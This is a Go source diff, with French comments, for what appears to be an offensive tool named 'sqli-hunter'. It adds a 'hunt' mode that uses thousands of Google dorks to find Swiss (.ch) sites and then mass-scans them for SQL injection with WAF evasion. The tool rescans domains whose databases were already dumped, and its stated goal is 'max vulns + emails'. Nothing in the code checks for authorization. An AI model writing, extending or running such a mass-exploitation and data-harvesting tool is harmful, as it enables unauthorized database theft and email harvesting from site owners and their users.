@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/signal"
 	"path/filepath"
+	"strconv"
 	"syscall"
 
 	"github.com/sqli-hunter/sqli-hunter/internal/discover"
@@ -15,33 +16,24 @@ import (
 	"github.com/sqli-hunter/sqli-hunter/internal/results"
 )
 
-// runBig lance une grosse passe hebdo (alias weekly).
-func runBig(args []string) {
-	runBigTier(discover.BigTierWeekly, args)
-}
+const huntScopeFile = "scope_hunt.txt"
 
-// runWeekly — max vulns + emails chaque semaine.
-func runWeekly(args []string) {
-	runBigTier(discover.BigTierWeekly, args)
-}
-
-// runMonthly — max vulns + emails chaque mois (encore plus large).
-func runMonthly(args []string) {
-	runBigTier(discover.BigTierMonthly, args)
-}
-
-func runBigTier(tier discover.BigTier, args []string) {
-	cfg, err := parseBigTierArgs(tier, args)
+// runHunt — discover + scan manuel (.ch), cycle 1–4 semaines sur le catalogue dorks.
+func runHunt(args []string) {
+	cfg, cycleWeeks, err := parseHuntArgs(args)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "erreur: %v\n", err)
 		os.Exit(1)
 	}
 
-	label, scopeFile := bigTierLabel(tier)
+	dorkTotal := len(discover.BuildBigDorks("ch", true))
+	pagesPerRun := discover.MaxPagesPerRun(cycleWeeks, dorkTotal)
+
 	printer := output.New(cfg.noColor, cfg.verbose)
 	printer.Header(version)
-	printer.KV("mode", label+" — max vulns + emails (.ch)")
-	printer.KV("discover", "6525+ dorks vuln + DBMS/WAF")
+	printer.KV("mode", "hunt — discover + scan (.ch)")
+	printer.KV("discover", fmt.Sprintf("%d dorks vuln + DBMS/WAF", dorkTotal))
+	printer.KV("cycle", fmt.Sprintf("%d semaine(s) · %d dorks/passe", cycleWeeks, pagesPerRun))
 	printer.KV("limit", discoverLimitLabel(cfg.discoverLimit))
 	printer.KV("threads", fmt.Sprintf("scan %d · urls %d · extract %d", cfg.threads, cfg.urlConcurrency, cfg.extractThreads))
 	printer.KV("scan", "full + waf + rescan domaines dumpés")
@@ -52,9 +44,9 @@ func runBigTier(tier discover.BigTier, args []string) {
 	n := notify.Default()
 	notify.BoardLaunch(n)
 	if n.Enabled() {
-		n.DiscoverProgress("discover", 0, len(discover.BuildBigDorks("ch", cfg.discoverSubs)), 0, 0, 0)
+		n.DiscoverProgress("discover", 0, dorkTotal, 0, 0, 0)
 	}
-	_ = results.WriteRunStatus(cfg.outputDir, results.RunStatus{Phase: bigPhaseName(tier)})
+	_ = results.WriteRunStatus(cfg.outputDir, results.RunStatus{Phase: "hunt"})
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
@@ -70,12 +62,12 @@ func runBigTier(tier discover.BigTier, args []string) {
 	cfg.discoverDomain = "ch"
 	cfg.discoverSource = "google"
 	cfg.discoverSubs = true
-	cfg.discoverOutput = filepath.Join(cfg.outputDir, scopeFile)
+	cfg.discoverOutput = filepath.Join(cfg.outputDir, huntScopeFile)
 	cfg.skipScanned = false
 	cfg.rescan = true
 	cfg.allowEmptyDiscover = true
-	cfg.bigScan = true
-	cfg.bigTier = tier
+	cfg.huntScan = true
+	cfg.cycleWeeks = cycleWeeks
 	cfg.scanAfterDiscover = true
 
 	scopePath, count, err := discoverURLs(ctx, cfg, printer)
@@ -85,7 +77,7 @@ func runBigTier(tier discover.BigTier, args []string) {
 			if errors.Is(err, context.Canceled) {
 				msg = "discover interrompu (stop ou redémarrage)"
 			}
-			n.Error("Discover " + label + ": " + msg)
+			n.Error("Discover hunt: " + msg)
 		}
 		printer.Error(err.Error())
 		os.Exit(1)
@@ -105,7 +97,7 @@ func runBigTier(tier discover.BigTier, args []string) {
 
 	if err := executeScan(ctx, cfg, printer); err != nil {
 		if n.Enabled() {
-			n.Error("Scan " + label + ": " + err.Error())
+			n.Error("Scan hunt: " + err.Error())
 		}
 		printer.Error(err.Error())
 		os.Exit(1)
@@ -127,54 +119,46 @@ func printEmailStock(printer *output.Printer, outputDir string) {
 	}
 }
 
-func bigTierLabel(tier discover.BigTier) (label, scope string) {
-	switch tier {
-	case discover.BigTierMonthly:
-		return "monthly", "scope_monthly.txt"
-	default:
-		return "weekly", "scope_weekly.txt"
-	}
-}
-
-func bigPhaseName(tier discover.BigTier) string {
-	switch tier {
-	case discover.BigTierMonthly:
-		return "monthly"
-	default:
-		return "weekly"
-	}
-}
-
-func parseBigTierArgs(tier discover.BigTier, args []string) (config, error) {
-	urlThreads := "128"
-	extractThreads := "8"
-	scanThreads := "16"
-	progressEvery := "500"
-	if tier == discover.BigTierWeekly {
-		urlThreads = "96"
-		extractThreads = "6"
-		scanThreads = "12"
-		progressEvery = "200"
-	}
-	scanArgs := append([]string{
-		"-D", "ch", "--mass", "--full", "--waf", "--rescan",
-		"-t", "sqli,error,union,boolean,time",
-		"--url-threads", urlThreads,
-		"--threads", scanThreads,
-		"--extract-threads", extractThreads,
-		"--progress-every", progressEvery,
-	}, args...)
-	cfg, err := parseArgs(scanArgs)
-	if err != nil {
-		return cfg, err
-	}
-	cfg.discoverLimit = 0
-	return cfg, nil
-}
-
 func discoverLimitLabel(n int) string {
 	if n <= 0 {
 		return "illimité"
 	}
 	return fmt.Sprintf("%d urls", n)
+}
+
+func parseHuntArgs(args []string) (config, int, error) {
+	cycleWeeks := discover.CycleWeeksFromEnv()
+	var passthrough []string
+	for i := 0; i < len(args); i++ {
+		arg := args[i]
+		if arg == "--cycle-weeks" {
+			i++
+			if i >= len(args) {
+				return config{}, 0, fmt.Errorf("--cycle-weeks nécessite une valeur (1-4)")
+			}
+			n, err := strconv.Atoi(args[i])
+			if err != nil || n < 1 || n > 4 {
+				return config{}, 0, fmt.Errorf("--cycle-weeks doit être entre 1 et 4")
+			}
+			cycleWeeks = n
+			continue
+		}
+		passthrough = append(passthrough, arg)
+	}
+	cycleWeeks = discover.ClampCycleWeeks(cycleWeeks)
+
+	scanArgs := append([]string{
+		"-D", "ch", "--mass", "--full", "--waf", "--rescan",
+		"-t", "sqli,error,union,boolean,time",
+		"--url-threads", "96",
+		"--threads", "12",
+		"--extract-threads", "6",
+		"--progress-every", "200",
+	}, passthrough...)
+	cfg, err := parseArgs(scanArgs)
+	if err != nil {
+		return cfg, cycleWeeks, err
+	}
+	cfg.discoverLimit = 0
+	return cfg, cycleWeeks, nil
 }
